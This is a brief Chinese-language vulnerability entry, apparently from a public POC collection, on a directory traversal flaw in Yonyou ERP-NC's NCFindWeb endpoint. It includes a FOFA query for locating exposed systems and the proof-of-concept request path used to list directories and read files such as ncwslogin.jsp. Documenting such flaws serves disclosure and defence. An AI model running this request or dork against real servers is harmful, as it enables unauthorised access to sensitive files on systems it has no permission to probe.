# 用友 ERP-NC NCFindWeb 目录遍历漏洞

## 漏洞描述

用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息

## 漏洞影响

```
用友ERP-NC
```

## FOFA

```
app="用友-UFIDA-NC"
```

## 漏洞复现

POC为

```plain
/NCFindWeb?service=IPreAlertConfigService&filename=
```

![yongyou-8-1](./images/yongyou-8-1.png)

查看 ncwslogin.jsp 文件

![yongyou-8-2](./images/yongyou-8-2.png)